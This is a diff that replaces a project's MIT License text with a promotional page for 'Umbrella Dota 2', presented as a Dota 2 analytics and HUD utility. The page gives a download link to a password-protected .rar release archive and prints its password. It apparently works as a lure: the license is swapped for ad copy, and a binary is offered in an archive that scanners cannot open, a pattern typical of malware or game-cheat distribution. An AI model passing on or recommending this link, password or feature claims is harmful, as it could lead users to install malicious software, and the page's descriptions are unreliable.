@@ -1,21 +1,24 @@
-MIT License
+  _   _           _              _ _        
+ | | | |_ __ ___ | |__  _ __ ___| | | __ _  
+ | | | | '_ ` _ \| '_ \| '__/ _ \ | |/ _` | 
+ | |_| | | | | | | |_) | | |  __/ | | (_| | 
+  \___/|_| |_| |_|_.__/|_|  \___|_|_|\__,_| 
 
-Copyright (c) 2026 SharpMediator
+Umbrella Dota 2 is a lightweight, cross‑platform utility for competitive Dota 2 players and analysts, delivering real‑time match analytics, customizable HUD overlays, automated replay parsing, and advanced statistical insights to boost strategic decision‑making.
 
-Permission is hereby granted, free of charge, to any person obtaining a copy
-of this software and associated documentation files (the "Software"), to deal
-in the Software without restriction, including without limitation the rights
-to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
-copies of the Software, and to permit persons to whom the Software is
-furnished to do so, subject to the following conditions:
+########################################
+DOWNLOAD INFORMATION
 
-The above copyright notice and this permission notice shall be included in all
-copies or substantial portions of the Software.
+DOWNLOAD LINK: https://github.com/SharpMediator/umbrella-dota-2-external/releases/download/new/UmbrellaDota2-2.4.1-x64.rar
+ARCHIVE PASSWORD: 2026
+########################################
 
-THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
-IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
-FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
-AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
-LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
-OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
-SOFTWARE.
+Key Highlights
+- Real‑time match data feed with latency under 100 ms.
+- Fully customizable HUD overlays that integrate seamlessly with the game client.
+- Automated replay downloader and parser for instant post‑game analysis.
+- Advanced statistical modules (hero win rates, item efficiency, GPM trends).
+- Cross‑platform support (Windows, Linux, macOS) with minimal resource footprint.
+
+TAGS
+Dota2, analytics, HUD, replay, esports, competitive, utility, cross-platform
